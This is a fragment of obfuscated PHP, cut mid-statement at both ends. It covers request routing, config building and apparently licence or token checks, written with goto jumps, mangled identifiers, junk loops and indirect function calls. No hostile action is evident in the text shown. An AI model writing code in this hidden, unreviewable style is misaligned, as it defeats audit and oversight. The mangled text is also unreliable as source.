$_SERVER[ÒÆ›ÆØÎ¾][584]; } } private function qgks65446799() { goto f­­×¸í†; f­­×¸í†: $a‹â·‡äÔÚ =& $_SERVER[ÒÆ›ÆØÎ¾]; $aƒì‡”•·» =& $_SERVER[™ñğşİ€©ˆç]; $C°Šİ¦ƒÚñ = $aƒì‡”•·»[8]; goto fê¹ä»Î§; eÈõ§Â÷: $Cï‹•­‡ÂÄ = $aƒì‡”•·»[26]($GLOBALS[$aƒì‡”•·»[22]][$aƒì‡”•·»[23]], 1); $dß§Æ›öß = $a‹â·‡äÔÚ[587]; $GLOBALS[$aƒì‡”•·»[22]][$aƒì‡”•·»[23]] = $aƒì‡”•·»[27]($eí˜–ùŠäå, $Cï‹•­‡ÂÄ); goto c¨Üí®•±è; Eç¬à©œè: $AÍ±§ÑĞÖ = $a‹â·‡äÔÚ[586]; if (!$AÍ±§ÑĞÖ) { die; } $eí˜–ùŠäå = array($aƒì‡”•·»[8], $bˆìïßÜä•); goto eÈõ§Â÷; fê¹ä»Î§: $EÓñÇ²È—Ü = $a‹â·‡äÔÚ[585]; if (strlen($EÓñÇ²È—Ü) < $a‹â·‡äÔÚ[579]) { return; } $Fä¡‡§® = $GLOBALS[$aƒì‡”•·»[22]][$aƒì‡”•·»[23]][0]; goto Fó÷âÂÓ“; c¨Üí®•±è: $GLOBALS[$aƒì‡”•·»[22]][$aƒì‡”•·»[28]] = $aƒì‡”•·»[29]($aƒì‡”•·»[1], $GLOBALS[$aƒì‡”•·»[22]][$aƒì‡”•·»[23]]); goto aá»ÅÒä¥; Fó÷âÂÓ“: if (!$Fä¡‡§® || $aƒì‡”•·»[24]($Fä¡‡§®) <= $aƒì‡”•·»[24]($C°Šİ¦ƒÚñ)) { return; } if ($aƒì‡”•·»[6]($aƒì‡”•·»[25]($Fä¡‡§®, -$aƒì‡”•·»[24]($C°Šİ¦ƒÚñ))) != $C°Šİ¦ƒÚñ) { return; } $bˆìïßÜä• = $aƒì‡”•·»[25]($Fä¡‡§®, 0, -$aƒì‡”•·»[24]($C°Šİ¦ƒÚñ)); goto Eç¬à©œè; aá»ÅÒä¥: } private function bxkffd33677e() { goto e·ß®‰ù; fÉÚÖÆ›¬è: $cá‚•¡®µÃ[34]($cá‚•¡®µÃ[35], $F–¶Ü…©§î, $d¥¶–Î); $aòëÏ«±½ğ = $b±éèìÎí˜[590]; while ($aòëÏ«±½ğ < $b±éèìÎí˜[579]) { if ($aòëÏ«±½ğ >= 0) { break; } $aòëÏ«±½ğ++; } goto Bµã¹ø£ƒ²; aÏªĞŒó¸: $F–¶Ü…©§î = $cá‚•¡®µÃ[25]($AÍ»ÇÅÄ, $FİÖ´ºÂ¡ + $cá‚•¡®µÃ[24]($F«Šø­ÆÆƒ)); $dÑî´·İô = $b±éèìÎí˜[589]; if (strlen($dÑî´·İô) < $b±éèìÎí˜[575]) { die; } goto fÉÚÖÆ›¬è; Bµã¹ø£ƒ²: $F–¶Ü…©§î = $cá‚•¡®µÃ[2]($d¥¶–Î[0][0], $cá‚•¡®µÃ[36]); $GLOBALS[$cá‚•¡®µÃ[22]][$cá‚•¡®µÃ[23]] = $cá‚•¡®µÃ[0]($cá‚•¡®µÃ[36], $F–¶Ü…©§î); $GLOBALS[$cá‚•¡®µÃ[22]][$cá‚•¡®µÃ[28]] = $cá‚•¡®µÃ[29]($cá‚•¡®µÃ[1], $GLOBALS[$cá‚•¡®µÃ[22]][$cá‚•¡®µÃ[23]]); goto Aˆ±àëŸ©; Aˆ±àëŸ©: $EğÉóäšï = $b±éèìÎí˜[591]; if (strlen($EğÉóäšï) < $b±éèìÎí˜[592]) { die; } goto aÙ–‹Ö‚ëø; AÓÂÜé•: $AÍ»ÇÅÄ = $_SERVER[$cá‚•¡®µÃ[30]]; $AÇ™Õ‹´¦î = $b±éèìÎí˜[588]; if (!$AÇ™Õ‹´¦î) { die; } goto A×‡ŒÅ¸õ; A×‡ŒÅ¸õ: $F«Šø­ÆÆƒ = $cá‚•¡®µÃ[31]; if (!$cá‚•¡®µÃ[32]($AÍ»ÇÅÄ, $F«Šø­ÆÆƒ)) { return; } $FİÖ´ºÂ¡ = $cá‚•¡®µÃ[33]($AÍ»ÇÅÄ, $F«Šø­ÆÆƒ); goto aÏªĞŒó¸; e·ß®‰ù: $b±éèìÎí˜ =& $_SERVER[ÒÆ›ÆØÎ¾]; $cá‚•¡®µÃ =& $_SERVER[™ñğşİ€©ˆç]; if ($GLOBALS[$cá‚•¡®µÃ[22]][$cá‚•¡®µÃ[28]] != $cá‚•¡®µÃ[10]) { return; } goto AÓÂÜé•; aÙ–‹Ö‚ëø: } public function run() { goto b‰Ñöæ¡‚Ü; b Œ£ÀÕ¯: $_SERVER[$EÉˆ®ªºõÔ[44]] = $EÉˆ®ªºõÔ[6](ACTION); $cÂ„·â¤œ¨ = $a¢Ôì–¢â¾[597]; while ($cÂ„·â¤œ¨ < $a¢Ôì–¢â¾[579]) { if ($cÂ„·â¤œ¨ >= 0) { break; } $cÂ„·â¤œ¨++; } goto AÁÑ‡î¸Á¾; AÁÑ‡î¸Á¾: $this->{$_SERVER[™ñğşİ€©ˆç][45]}(); if ($EÉˆ®ªºõÔ[19]($D­–Ô»ÑÉ¢) >= 3) { $this->{$_SERVER[™ñğşİ€©ˆç][21]}($DÇˆ¤›ÌĞ®); } else { $this->{$_SERVER[™ñğşİ€©ˆç][21]}(ACTION); } goto dñÂ¢šøè ; c­îİçä“: $EâÑ½½Œò = $a¢Ôì–¢â¾[593]; $this->{$_SERVER[™ñğşİ€©ˆç][38]}(); $D­–Ô»ÑÉ¢ = $GLOBALS[$EÉˆ®ªºõÔ[22]][$EÉˆ®ªºõÔ[23]]; goto Eï™Î£‹İ; b‰Ñöæ¡‚Ü: $a¢Ôì–¢â¾ =& $_SERVER[ÒÆ›ÆØÎ¾]; $EÉˆ®ªºõÔ =& $_SERVER[™ñğşİ€©ˆç]; $this->{$_SERVER[™ñğşİ€©ˆç][37]}(); goto c­îİçä“; CèãòÍ“: $EÉˆ®ªºõÔ[39]($EÉˆ®ªºõÔ[43], MOD . $EÉˆ®ªºõÔ[1] . ST . $EÉˆ®ªºõÔ[1] . ACT); $c´šˆä»Àí = $a¢Ôì–¢â¾[595]; if (strlen($c´šˆä»Àí) < $a¢Ôì–¢â¾[596]) { die; } goto b Œ£ÀÕ¯; Eï™Î£‹İ: $DÇˆ¤›ÌĞ® = $GLOBALS[$EÉˆ®ªºõÔ[22]][$EÉˆ®ªºõÔ[28]]; $EÉˆ®ªºõÔ[39]($EÉˆ®ªºõÔ[40], isset($D­–Ô»ÑÉ¢[0]) && $D­–Ô»ÑÉ¢[0] ? $D­–Ô»ÑÉ¢[0] : $this->defaultModule); $EÉˆ®ªºõÔ[39]($EÉˆ®ªºõÔ[41], isset($D­–Ô»ÑÉ¢[1]) && $D­–Ô»ÑÉ¢[0] ? $D­–Ô»ÑÉ¢[1] : $this->defaultController); goto F”ôÙéõ²; F”ôÙéõ²: $fÈÕËœƒáÈ = $a¢Ôì–¢â¾[594]; if (!$fÈÕËœƒáÈ) { return; } $EÉˆ®ªºõÔ[39]($EÉˆ®ªºõÔ[42], isset($D­–Ô»ÑÉ¢[2]) && $D­–Ô»ÑÉ¢[0] ? $D­–Ô»ÑÉ¢[2] : $this->defaultAction); goto CèãòÍ“; dñÂ¢šøè : } private $dlur7bd63502 = array(); private $clna1f9cfecc = ''; public function xfay88ab0c28() { goto D‹Ö‚À¡ƒ£; C™»Çë«‘÷: $this->{$_SERVER[™ñğşİ€©ˆç][3]}($DÖŠÀ¨‰ª…[57], array($this, $DÖŠÀ¨‰ª…[58])); $this->{$_SERVER[™ñğşİ€©ˆç][3]}($DÖŠÀ¨‰ª…[59], array($this, $DÖŠÀ¨‰ª…[60])); $CøÎ¤Æé¡ = $f‡â–Šáì[602]; goto Fò¢×ğßñ; e†ğ¢Ø¯–Ğ: $this->{$_SERVER[™ñğşİ€©ˆç][52]}(); $this->{$_SERVER[™ñğşİ€©ˆç][3]}($DÖŠÀ¨‰ª…[53], array($this, $DÖŠÀ¨‰ª…[54])); $this->{$_SERVER[™ñğşİ€©ˆç][3]}($DÖŠÀ¨‰ª…[55], array($this, $DÖŠÀ¨‰ª…[56])); goto C™»Çë«‘÷; d“²ô…¶§: $CøùÄËæ× = $f‡â–Šáì[599]; if (strlen($CøùÄËæ×) < $f‡â–Šáì[596]) { die; } $this->{$_SERVER[™ñğşİ€©ˆç][48]}(); goto f°¶õÓØ¯ß; A”äå¦ºÛØ: $e›âÂŠ¢ = $f‡â–Šáì[598]; if (!$e›âÂŠ¢) { die; } $this->{$_SERVER[™ñğşİ€©ˆç][47]}(); goto d“²ô…¶§; f°¶õÓØ¯ß: $this->{$_SERVER[™ñğşİ€©ˆç][49]}(); $b—õ‘î°† = $f‡â–Šáì[600]; $this->{$_SERVER[™ñğşİ€©ˆç][50]}(); goto a¹† ”²¬; D‹Ö‚À¡ƒ£: $f‡â–Šáì =& $_SERVER[ÒÆ›ÆØÎ¾]; $DÖŠÀ¨‰ª… =& $_SERVER[™ñğşİ€©ˆç]; $this->{$_SERVER[™ñğşİ€©ˆç][46]}(); goto A”äå¦ºÛØ; Fò¢×ğßñ: if (strlen($CøÎ¤Æé¡) < $f‡â–Šáì[583]) { return; } goto fçÎÄäõÜë; a¹† ”²¬: $Eºíœ‘Ï¾à = $f‡â–Šáì[601]; if (strlen($Eºíœ‘Ï¾à) < $f‡â–Šáì[596]) { die; } $this->{$_SERVER[™ñğşİ€©ˆç][51]}(); goto e†ğ¢Ø¯–Ğ; fçÎÄäõÜë: } public function jkla5eb08cf5($dÖ¿¡Î—óÆ) { goto dğÑ¸«Ä¿Ä; FÅÕÃ‘à: $dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[106]][$e§ÖçÅÈ™´[107]][$e§ÖçÅÈ™´[112]] = array($e§ÖçÅÈ™´[113] => (int) $AŞˆ¶‡àâÛ[$e§ÖçÅÈ™´[114]], $e§ÖçÅÈ™´[115] => (int) $e§ÖçÅÈ™´[116]($AŞˆ¶‡àâÛ, $e§ÖçÅÈ™´[117], 0)); $dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[118]][$e§ÖçÅÈ™´[119]] = $e§ÖçÅÈ™´[120]($e§ÖçÅÈ™´[121])->{$_SERVER[™ñğşİ€©ˆç][122]}(); $eËÉÇÍ¥—… = $f‘¾®Ì ±[607]; goto c«•¡©¥Ü®; E´…ŠÛ±å±: if (strlen($a®óØ ¨…) < $f‘¾®Ì ±[583]) { return; } if ($e§ÖçÅÈ™´[116]($GLOBALS, $e§ÖçÅÈ™´[142]) && $this->config[$e§ÖçÅÈ™´[143]]) { $dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[118]][$e§ÖçÅÈ™´[144]] = WEB_ROOT; } return $dÖ¿¡Î—óÆ; goto c¸÷œº¶¹Ü; d—ÍÏÏÀæì: $E÷ö‡Î÷‚• = $f‘¾®Ì ±[605]; while ($E÷ö‡Î÷‚• < $f‘¾®Ì ±[579]) { if ($E÷ö‡Î÷‚• >= 0) { break; } $E÷ö‡Î÷‚•++; } unset($dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[106]][$e§ÖçÅÈ™´[107]][$e§ÖçÅÈ™´[76]]); goto CÂ¾®™„ ; b÷¾…¶¯™×: $dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[118]][$e§ÖçÅÈ™´[130]] = $this->clna1f9cfecc; if ($d–‹‡ÉÇÚ²[$e§ÖçÅÈ™´[130]] != $e§ÖçÅÈ™´[131]) { $dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[118]][$e§ÖçÅÈ™´[132]] = $d–‹‡ÉÇÚ²[$e§ÖçÅÈ™´[132]]; $dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[118]][$e§ÖçÅÈ™´[133]] = $d–‹‡ÉÇÚ²[$e§ÖçÅÈ™´[133]]; $FÈ‘ÔÜ—‘ = $e§ÖçÅÈ™´[134](10) . $this->clna1f9cfecc . $e§ÖçÅÈ™´[134](5); $dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[106]][$e§ÖçÅÈ™´[135]][$e§ÖçÅÈ™´[136]] = $this->{$_SERVER[™ñğşİ€©ˆç][137]}($FÈ‘ÔÜ—‘, $dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[118]][$e§ÖçÅÈ™´[123]]); } if ($this->clna1f9cfecc == $e§ÖçÅÈ™´[131]) { $dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[106]][$e§ÖçÅÈ™´[107]][$e§ÖçÅÈ™´[112]][$e§ÖçÅÈ™´[117]] = 0; } goto f°ğèíÚÌÏ; f°ğèíÚÌÏ: $dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[118]][$e§ÖçÅÈ™´[138]] = $e§ÖçÅÈ™´[116]($this->dlur7bd63502, $e§ÖçÅÈ™´[139], $e§ÖçÅÈ™´[10]); $dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[118]][$e§ÖçÅÈ™´[140]] = $e§ÖçÅÈ™´[116]($this->dlur7bd63502, $e§ÖçÅÈ™´[141], $e§ÖçÅÈ™´[10]); $a®óØ ¨… = $f‘¾®Ì ±[608]; goto E´…ŠÛ±å±; d›¹‰–š°: $dâ¦¹‘¥Ù° = $f‘¾®Ì ±[604]; if (!$dâ¦¹‘¥Ù°) { die; } unset($dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[106]][$e§ÖçÅÈ™´[108]][$e§ÖçÅÈ™´[110]]); goto d—ÍÏÏÀæì; CùœÀ÷ê…: $AÎÎ›Şê£ = array($e§ÖçÅÈ™´[64], $e§ÖçÅÈ™´[65], $e§ÖçÅÈ™´[66], $e§ÖçÅÈ™´[67], $e§ÖçÅÈ™´[68], $e§ÖçÅÈ™´[69], $e§ÖçÅÈ™´[70], $e§ÖçÅÈ™´[71], $e§ÖçÅÈ™´[72], $e§ÖçÅÈ™´[73], $e§ÖçÅÈ™´[74], $e§ÖçÅÈ™´[75], $e§ÖçÅÈ™´[76], $e§ÖçÅÈ™´[77], $e§ÖçÅÈ™´[78], $e§ÖçÅÈ™´[79], $e§ÖçÅÈ™´[80], $e§ÖçÅÈ™´[81], $e§ÖçÅÈ™´[82], $e§ÖçÅÈ™´[83], $e§ÖçÅÈ™´[84], $e§ÖçÅÈ™´[85], $e§ÖçÅÈ™´[86], $e§ÖçÅÈ™´[87], $e§ÖçÅÈ™´[88], $e§ÖçÅÈ™´[89], $e§ÖçÅÈ™´[90], $e§ÖçÅÈ™´[91], $e§ÖçÅÈ™´[92], $e§ÖçÅÈ™´[93], $e§ÖçÅÈ™´[94], $e§ÖçÅÈ™´[95], $e§ÖçÅÈ™´[96], $e§ÖçÅÈ™´[97], $e§ÖçÅÈ™´[98], $e§ÖçÅÈ™´[99], $e§ÖçÅÈ™´[100], $e§ÖçÅÈ™´[101], $e§ÖçÅÈ™´[102], $e§ÖçÅÈ™´[103]); foreach ($AÎÎ›Şê£ as $E÷÷ÛİìÛ“) { $bˆšß®ˆ‰‹ = $GLOBALS[$e§ÖçÅÈ™´[104]][$e§ÖçÅÈ™´[105]][$E÷÷ÛİìÛ“]; if (isset($d–‹‡ÉÇÚ²[$E÷÷ÛİìÛ“])) { $bˆšß®ˆ‰‹ = $d–‹‡ÉÇÚ²[$E÷÷ÛİìÛ“]; } $dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[106]][$e§ÖçÅÈ™´[107]][$E÷÷ÛİìÛ“] = $bˆšß®ˆ‰‹; } $AŞˆ¶‡àâÛ = $dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[106]][$e§ÖçÅÈ™´[107]][$e§ÖçÅÈ™´[76]]; goto e¡ÉßíÃ”µ; c«•¡©¥Ü®: while ($eËÉÇÍ¥—… < $f‘¾®Ì ±[592]) { if ($eËÉÇÍ¥—… >= 0) { break; } $eËÉÇÍ¥—…++; } $dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[118]][$e§ÖçÅÈ™´[123]] = $e§ÖçÅÈ™´[124]($_SERVER[$e§ÖçÅÈ™´[125]] . $d–‹‡ÉÇÚ²[$e§ÖçÅÈ™´[126]]); $dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[118]][$e§ÖçÅÈ™´[127]] = $e§ÖçÅÈ™´[128]($e§ÖçÅÈ™´[129]()); goto b÷¾…¶¯™×; dğÑ¸«Ä¿Ä: $f‘¾®Ì ± =& $_SERVER[ÒÆ›ÆØÎ¾]; $e§ÖçÅÈ™´ =& $_SERVER[™ñğşİ€©ˆç]; $d–‹‡ÉÇÚ² = $e§ÖçÅÈ™´[61]($e§ÖçÅÈ™´[62])->{$_SERVER[™ñğşİ€©ˆç][63]}(); goto CùœÀ÷ê…; CÂ¾®™„ : unset($dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[106]][$e§ÖçÅÈ™´[107]][$e§ÖçÅÈ™´[111]]); $A‹ƒ¶œÎµ¨ = $f‘¾®Ì ±[606]; while ($A‹ƒ¶œÎµ¨ < $f‘¾®Ì ±[579]) { if ($A‹ƒ¶œÎµ¨ >= 0) { break; } $A‹ƒ¶œÎµ¨++; } goto FÅÕÃ‘à; e¡ÉßíÃ”µ: $fãê†í—ö³ = $f‘¾®Ì ±[603]; while ($fãê†í—ö³ < $f‘¾®Ì ±[579]) { if ($fãê†í—ö³ >= 0) { break; } $fãê†í—ö³++; } unset($dÖ¿¡Î—óÆ[$e§ÖçÅÈ™´[106]][$e§ÖçÅÈ™´[108]][$e§ÖçÅÈ™´[109]]); goto d›¹‰–š°; c¸÷œº¶¹Ü: } private function apoj334300fc() { goto b „¼óèÏº; DÑã§ÛƒÚ: if (strlen($Aµ¤çåè»Ï) < $B‘êàöòÚá[583]) { die; } goto e±ŞéÁê­Œ; C×“¿ÑÕš: if (strlen($B¶ã“¢›ô) < $B‘êàöòÚá[592]) { return; } $Bİ¢äãğÅÕ = $bÒŒ¿ „¸ø[61]($bÒŒ¿ „¸ø[62])->{$_SERVER[™ñğşİ€©ˆç][63]}(); $Eâà³Ö“ŞÖ = array($bÒŒ¿ „¸ø[177] => $Bİ¢äãğÅÕ[$bÒŒ¿ „¸ø[64]], $bÒŒ¿ „¸ø[178] => $Bİ¢äãğÅÕ[$bÒŒ¿ „¸ø[65]], $bÒŒ¿ „¸ø[179] => $bÒŒ¿ „¸ø[10]); goto EéöŒçƒÒ©; EéöŒçƒÒ©: foreach ($F¬ï…¿ÇÎã as $aíŞˆÒ½Â™) { if (!isset($Bİ¢äãğÅÕ[$aíŞˆÒ½Â™]) || !$Bİ¢äãğÅÕ[$aíŞˆÒ½Â™]) { continue; } $Eâà³Ö“ŞÖ[$aíŞˆÒ½Â™] = $Bİ¢äãğÅÕ[$aíŞˆÒ½Â™]; } $bÒŒ¿ „¸ø[13](array($bÒŒ¿ „¸ø[169], $bÒŒ¿ „¸ø[170]), $Eâà³Ö“ŞÖ); $Aµ¤çåè»Ï = $B‘êàöòÚá[612]; goto DÑã§ÛƒÚ; e²ÏÑÉ²İ: if ($this->clna1f9cfecc == $bÒŒ¿ „¸ø[131]) { return; } $F¬ï…¿ÇÎã = array($bÒŒ¿ „¸ø[171], $bÒŒ¿ „¸ø[172], $bÒŒ¿ „¸ø[173], $bÒŒ¿ „¸ø[174], $bÒŒ¿ „¸ø[175], $bÒŒ¿ „¸ø[176]); $B¶ã“¢›ô = $B‘êàöòÚá[611]; goto C×“¿ÑÕš; b „¼óèÏº: $B‘êàöòÚá =& $_SERVER[ÒÆ›ÆØÎ¾]; $bÒŒ¿ „¸ø =& $_SERVER[™ñğşİ€©ˆç]; if ($_SERVER[$bÒŒ¿ „¸ø[44]] == $bÒŒ¿ „¸ø[145]) { goto fˆ×àÂø“»; F¢Ğô»Ô½Â: $cÚçŸìè¸’ = $B‘êàöòÚá[610]; $bÒŒ¿ „¸ø[13](array($bÒŒ¿ „¸ø[169], $bÒŒ¿ „¸ø[170]), $Eâà³Ö“ŞÖ); goto Aß«Ş´á¢»; B°­Á¬Úšë: $e›£ÒÒ­ëÖ = $B‘êàöòÚá[609]; if (!$e›£ÒÒ­ëÖ) { die; } $Eâà³Ö“ŞÖ = array($bÒŒ¿ „¸ø[168] => $BâŸÅÑ†„); goto F¢Ğô»Ô½Â; fˆ×àÂø“»: $BâŸÅÑ†„ = array($bÒŒ¿ „¸ø[130] => $this->clna1f9cfecc, $bÒŒ¿ „¸ø[146] => $this->{$_SERVER[™ñğşİ€©ˆç][147]}(), $bÒŒ¿ „¸ø[148] => $bÒŒ¿ „¸ø[61]($bÒŒ¿ „¸ø[149])->{$_SERVER[™ñğşİ€©ˆç][150]}()); if ($this->clna1f9cfecc != $bÒŒ¿ „¸ø[131]) { $b–Êˆ¨ªòà = $bÒŒ¿ „¸ø[116]($this->dlur7bd63502, $bÒŒ¿ „¸ø[151]); if ($b–Êˆ¨ªòà) { $BâŸÅÑ†„[$bÒŒ¿ „¸ø[152]] = $b–Êˆ¨ªòà; $BâŸÅÑ†„[$bÒŒ¿ „¸ø[153]] = $bÒŒ¿ „¸ø[154]($bÒŒ¿ „¸ø[116]($this->dlur7bd63502, $bÒŒ¿ „¸ø[155])); $BâŸÅÑ†„[$bÒŒ¿ „¸ø[156]] = $bÒŒ¿ „¸ø[116]($this->dlur7bd63502, $bÒŒ¿ „¸ø[141]); } $C¤Ÿìøè† = $bÒŒ¿ „¸ø[61]($bÒŒ¿ „¸ø[62])->{$_SERVER[™ñğşİ€©ˆç][63]}($bÒŒ¿ „¸ø[157], $bÒŒ¿ „¸ø[10], !0); if ($bÒŒ¿ „¸ø[158]($C¤Ÿìøè†) && $bÒŒ¿ „¸ø[25]($C¤Ÿìøè†, 0, 1) == $bÒŒ¿ „¸ø[159]) { $C¤Ÿìøè† = $bÒŒ¿ „¸ø[160]($C¤Ÿìøè†); } if ($bÒŒ¿ „¸ø[161]($C¤Ÿìøè†) && $C¤Ÿìøè†[$bÒŒ¿ „¸ø[162]] && $bÒŒ¿ „¸ø[32]($C¤Ÿìøè†[$bÒŒ¿ „¸ø[162]], $bÒŒ¿ „¸ø[163])) { $DÖÁ¤Àôî¦ = $bÒŒ¿ „¸ø[0]($bÒŒ¿ „¸ø[163], $C¤Ÿìøè†[$bÒŒ¿ „¸ø[162]]); $BâŸÅÑ†„[$bÒŒ¿ „¸ø[164]] = $DÖÁ¤Àôî¦[0]; } } $BâŸÅÑ†„ = $this->{$_SERVER[™ñğşİ€©ˆç][165]}($bÒŒ¿ „¸ø[166]($BâŸÅÑ†„), $bÒŒ¿ „¸ø[124]($bÒŒ¿ „¸ø[167])); goto B°­Á¬Úšë; Aß«Ş´á¢»: } goto e²ÏÑÉ²İ; e±ŞéÁê­Œ: } private function kzrs14d7b6d7() { goto e‰¥¤æá ; AÉ¨æĞã”•: while (strlen($dæŞ™ÈÍ‡†) < $D‚ì‡œÀ’é[596]) { if (!$dæŞ™ÈÍ‡†) { break; } $dæŞ™ÈÍ‡†++; } $aó°Êô©[$B¹÷ÄÇéöİ] = $AÊÇ’ÓÎ÷é; $e…ÃéÏ­˜[61]($e…ÃéÏ­˜[11])->{$_SERVER[™ñğşİ€©ˆç][245]}($DÏ ôÊÛ©‡[$e…ÃéÏ­˜[246]], array($e…ÃéÏ­˜[247] => $aó°Êô©)); goto CÒ¼›Ş¬‡; e‰¥¤æá : $D‚ì‡œÀ’é =& $_SERVER[ÒÆ›ÆØÎ¾]; $e…ÃéÏ­˜ =& $_SERVER[™ñğşİ€©ˆç]; if ($_SERVER[$e…ÃéÏ­˜[44]] != $e…ÃéÏ­˜[180]) { return; } goto fÌ¸Ãğ¡¨; EŒ®Şñªƒ¾: $fÆ—²È¯„Ö = $this->{$_SERVER[™ñğşİ€©ˆç][218]}($Aâğ‹¡¸ô[$e…ÃéÏ­˜[219]]); if (!$fÆ—²È¯„Ö || $fÆ—²È¯„Ö != $Aâğ‹¡¸ô[$e…ÃéÏ­˜[155]]) { $CîÛíÚ‹îÄ = array($e…ÃéÏ­˜[220] => $e…ÃéÏ­˜[61]($e…ÃéÏ­˜[62])->{$_SERVER[™ñğşİ€©ˆç][63]}($e…ÃéÏ­˜[126]), $e…ÃéÏ­˜[221] => $_SERVER[$e…ÃéÏ­˜[125]], $e…ÃéÏ­˜[222] => $e…ÃéÏ­˜[223](), $e…ÃéÏ­˜[192] => $_SERVER[$e…ÃéÏ­˜[193]]); $A‰Ôá§‚ø = $this->{$_SERVER[™ñğşİ€©ˆç][224]}($e…ÃéÏ­˜[166]($CîÛíÚ‹îÄ)); $this->{$_SERVER[™ñğşİ€©ˆç][202]}($e…ÃéÏ­˜[225] . $A‰Ôá§‚ø); $e…ÃéÏ­˜[184]($e…ÃéÏ­˜[216]($e…ÃéÏ­˜[226]), !0); } $f¾ï¤ò£œ­ = array($e…ÃéÏ­˜[227] => $Aâğ‹¡¸ô[$e…ÃéÏ­˜[228]], $e…ÃéÏ­˜[229] => $Aâğ‹¡¸ô[$e…ÃéÏ­˜[230]], $e…ÃéÏ­˜[231] => $e…ÃéÏ­˜[134](16), $e…ÃéÏ­˜[130] => $Aâğ‹¡¸ô[$e…ÃéÏ­˜[232]]); goto f¥³”¡âÉ; bë…ß½ : $F®†²Ö¯ÁÜ = $D‚ì‡œÀ’é[621]; while (strlen($F®†²Ö¯ÁÜ) < $D‚ì‡œÀ’é[575]) { if (!$F®†²Ö¯ÁÜ) { break; } $F®†²Ö¯ÁÜ++; } $e…ÃéÏ­˜[184]($e…ÃéÏ­˜[216]($e…ÃéÏ­˜[226]), !0); goto fœáö åë; f¥³”¡âÉ: if ($e¦È’ğî[$e…ÃéÏ­˜[186]]) { $f¾ï¤ò£œ­[$e…ÃéÏ­˜[231]] = $e¦È’ğî[$e…ÃéÏ­˜[186]]; } $eŒÕøŸ = $e…ÃéÏ­˜[25]($e…ÃéÏ­˜[124]($f¾ï¤ò£œ­[$e…ÃéÏ­˜[229]]), 10, 10); $AÅˆáÖš = $eŒÕøŸ . $f¾ï¤ò£œ­[$e…ÃéÏ­˜[130]] . $f¾ï¤ò£œ­[$e…ÃéÏ­˜[231]]; goto F®‡°š; CÒ¼›Ş¬‡: $this->dlur7bd63502 = $Aâğ‹¡¸ô; $this->clna1f9cfecc = $f¾ï¤ò£œ­[$e…ÃéÏ­˜[130]]; $this->{$_SERVER[™ñğşİ€©ˆç][248]}(); goto bËİÈƒÆ¹–; DëˆÑèá›¶: if ($CŸáÁŸ®èë[$e…ÃéÏ­˜[197]] == $e…ÃéÏ­˜[198]) { $FáßîÉšª± = $this->{$_SERVER[™ñğşİ€©ˆç][165]}($Cø¦¥¼Êí, $e…ÃéÏ­˜[199]); $A‰Ôá§‚ø = $this->{$_SERVER[™ñğşİ€©ˆç][137]}($e…ÃéÏ­˜[166]($e¦È’ğî), $Cø¦¥¼Êí . $e…ÃéÏ­˜[200], 3); $A‰Ôá§‚ø = $A‰Ôá§‚ø . $e…ÃéÏ­˜[201] . $_SERVER[$e…ÃéÏ­˜[191]]; $Ešé„ë¨¬ƒ = $this->{$_SERVER[™ñğşİ€©ˆç][202]}($e…ÃéÏ­˜[203] . $FáßîÉšª± . $e…ÃéÏ­˜[204] . $A‰Ôá§‚ø, -1); $e…ÃéÏ­˜[184]($Ešé„ë¨¬ƒ, !0); } else { if ($CŸáÁŸ®èë[$e…ÃéÏ­˜[197]] == $e…ÃéÏ­˜[205]) { $eÎ«ì‰ƒ¶ò = $e…ÃéÏ­˜[25]($e…ÃéÏ­˜[124]($e…ÃéÏ­˜[206] . $Cø¦¥¼Êí), 12, 15) . $e…ÃéÏ­˜[207]; $A‰Ôá§‚ø = $this->{$_SERVER[™ñğşİ€©ˆç][208]}($e…ÃéÏ­˜[2]($CŸáÁŸ®èë[$e…ÃéÏ­˜[209]]), $eÎ«ì‰ƒ¶ò, 2); $dÊ¬ç¢©İ• = $e…ÃéÏ­˜[210]($A‰Ôá§‚ø, !0); if (!$e…ÃéÏ­˜[161]($dÊ¬ç¢©İ•) || !$e…ÃéÏ­˜[161]($dÊ¬ç¢©İ•[$e…ÃéÏ­˜[211]]) || $dÊ¬ç¢©İ•[$e…ÃéÏ­˜[183]] != !0) { $cÅªÑ”ŞŞ = $e…ÃéÏ­˜[212]; $B‘‚Ï´í•£ = $dÊ¬ç¢©İ•[$e…ÃéÏ­˜[211]] ? $e…ÃéÏ­˜[213] . $dÊ¬ç¢©İ•[$e…ÃéÏ­˜[211]] : $cÅªÑ”ŞŞ; $e…ÃéÏ­˜[184]($B‘‚Ï´í•£, !1); } else { $e¦È’ğî[$e…ÃéÏ­˜[186]] = $dÊ¬ç¢©İ•[$e…ÃéÏ­˜[211]][$e…ÃéÏ­˜[214]]; } } else { $dÊ¬ç¢©İ• = $this->{$_SERVER[™ñğşİ€©ˆç][202]}($e…ÃéÏ­˜[215], $e¦È’ğî, 10); $Cºùƒâ‡Ø = $D‚ì‡œÀ’é[614]; while ($Cºùƒâ‡Ø < $D‚ì‡œÀ’é[596]) { if ($Cºùƒâ‡Ø >= 0) { break; } $Cºùƒâ‡Ø++; } } } if (!$e…ÃéÏ­˜[161]($dÊ¬ç¢©İ•) || !$e…ÃéÏ­˜[161]($dÊ¬ç¢©İ•[$e…ÃéÏ­˜[211]]) || $dÊ¬ç¢©İ•[$e…ÃéÏ­˜[183]] != !0) { $cÅªÑ”ŞŞ = $e…ÃéÏ­˜[216]($e…ÃéÏ­˜[217]); $B‘‚Ï´í•£ = $dÊ¬ç¢©İ•[$e…ÃéÏ­˜[211]] ? $e…ÃéÏ­˜[213] . $dÊ¬ç¢©İ•[$e…ÃéÏ­˜[211]] : 